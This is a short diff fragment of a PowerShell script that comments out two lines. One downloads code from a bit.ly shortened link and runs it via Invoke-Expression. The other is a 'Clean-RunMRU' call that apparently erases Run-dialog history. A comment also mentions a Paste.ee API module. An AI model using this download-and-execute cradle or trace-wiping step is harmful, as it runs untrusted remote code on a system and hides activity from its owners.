@@ -6,8 +6,8 @@ param (
 	################################################
 	)
 	
-	Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bWu5ef')
-	Clean-RunMRU -Last
+	#Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bWu5ef')
+	#Clean-RunMRU -Last
 	
 	$Command = "
 	# Import Paste.ee API module
